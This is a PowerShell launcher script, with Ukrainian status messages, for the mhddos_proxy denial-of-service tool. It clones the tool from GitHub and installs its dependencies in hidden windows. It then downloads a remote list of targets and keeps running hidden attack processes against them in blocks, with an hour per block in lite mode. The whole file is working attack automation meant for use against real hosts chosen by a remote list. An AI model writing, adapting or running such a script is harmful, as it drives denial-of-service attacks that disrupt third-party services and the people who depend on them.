#Requires -Version 7

.\functions.ps1

$GitPath = $PSScriptRoot + "\\Git\\bin\\";
$GitExe = $GitPath + "git.exe";
$PythonPath = $PSScriptRoot + "\\Python\\";
$PythonExe = $PythonPath + "python.exe";
$MhddosPath = $PSScriptRoot + "\\Mhddos_proxy\\";

$mhddos_proxy_URL = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git';
$TargetsURI = 'https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets';

$LiteBlockSize = 50;
$BlockSize = $LiteBlockSize * 4;
$MinutesPerBlock = 60;

$ErrorActionPreference = "SilentlyContinue";
$ProgressPreference = "SilentlyContinue";
$WarningPreference = "SilentlyContinue";

$RunnerVersion = "1.0.0 Alpha / Winged ratel";
if ($args -like "*-lite*") {
    $RunningLite = $true;
}
else {
    $RunningLite = $false;
}

$host.UI.RawUI.BackgroundColor = [ConsoleColor]::Black
$host.UI.RawUI.ForegroundColor = [ConsoleColor]::Green
Clear-Host;
$Banner = Get-Banner;
Write-Host $Banner;
$StartupMessage = "Бігунець версії $RunnerVersion"
if ($RunningLite) {
    $StartupMessage = $StartupMessage + " Lite"
}
Clear-Line $StartupMessage;
Set-Location $PSScriptRoot;

if (Test-Path $MhddosPath) {
    $Runners = Get-ProcCmdline "$MhddosPath"
    if ($Runners.Count -gt 0) {
        while (($null -ne $Runners) -and ($Runners.Count -gt 0)) {
            foreach ($LockingID in $Runners) {
                Stop-Tree $lockingID
            }
            $RunnerProc = Get-Process | `
                Where-Object { $_.Path -like $PythonExe } | `
                Select-Object -ExpandProperty ProcessId
            foreach ($LockingID in $RunnerProc) {
                Stop-Tree $lockingID
            }
            $Runners = Get-CimInstance win32_process | `
                Where-Object { $_.CommandLine -like "*$MhddosPath*" } | `
                Select-Object -ExpandProperty ProcessId
        }
    }
    Remove-Item $MhddosPath -Recurse -Force
}
Clear-Line "Отримуємо найновішу версію mhddos_proxy...";
$GitArgs = "clone $mhddos_proxy_URL $PSScriptRoot";
Start-Process -FilePath $GitExe -ArgumentList $GitArgs -Wait -WindowStyle Hidden;
Set-Location $MhddosPath;
Clear-Line "Встановлюемо необхідні модулі...";
$PyArgs = "-m pip install --upgrade pip";
Start-Process -FilePath $PythonExe -ArgumentList $PyArgs -Wait -WindowStyle Hidden;
$PyArgs = "-m pip install -r requirements.txt";
Start-Process -FilePath $PythonExe -ArgumentList $PyArgs -Wait -WindowStyle Hidden;

Clear-Line "Отримуємо список цілей...";
$TargetList = Get-Targets $TargetsURI $RunningLite;
$StopRequested = $false;
$StartTask = $true;
[System.Collections.ArrayList]$IDList = @();

while (-not $StopRequested) {
    if ($StartTask -and (-not $RunningLite)) {
        $Targets = $TargetList | Spit-Array -size $BlockSize;
        foreach ($Target in $Targets) {
            if ($Target.Count -gt 0) {
                $TargetString = $Target -join ' ';
                $RunnerArgs = $('runner.py ' + $TargetString);
                $PyProcess = Start-Process -FilePath $PythonExe -WorkingDirectory $WorkDir -ArgumentList $RunnerArgs -WindowStyle Hidden -PassThru;
                $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
                $IDList += $PyProcess.Id;
            }
        }
    }
    if ($StartTask -and $RunningLite) {
        $Targets = $TargetList | Spit-Array -size $LiteBlockSize;
        foreach ($Target in $Targets) {
            if ($Target.Count -gt 0) {
                $TargetString = $Target -join ' ';
                $Runner_args = $('runner.py ' + $TargetString);
                $PyProcess = Start-Process -FilePath $PythonExe -WorkingDirectory $WorkDir -ArgumentList $Runner_args -WindowStyle Hidden -PassThru;
                # We REALLY do not want our system to hang.
                $PyProcess.PriorityClass = [System.Diagnostics.ProcessPriorityClass]::Idle;
                $StartedBlockJob = [System.DateTime]::Now;
                $StopBlockJob = $StartedBlockJob.AddMinutes($MinutesPerBlock);
                while (($PyProcess.HasExited -eq $false) -and ($StopBlockJob -gt [System.DateTime]::Now)) {
                    $BlockJobLeft = [int] $($StopBlockJob - [System.DateTime]::Now).TotalMinutes;
                    Clear-Line "$BlockJobLeft хвилин братерства на $($Target.Count) цілей";
                    Start-Sleep -Seconds 5;
                }
                Stop-Tree $PyProcess.Id;
                Clear-Line "Відпрацювали $($Target.Count) цілей. Беремо наступний блок";
            }
        }
    }
}
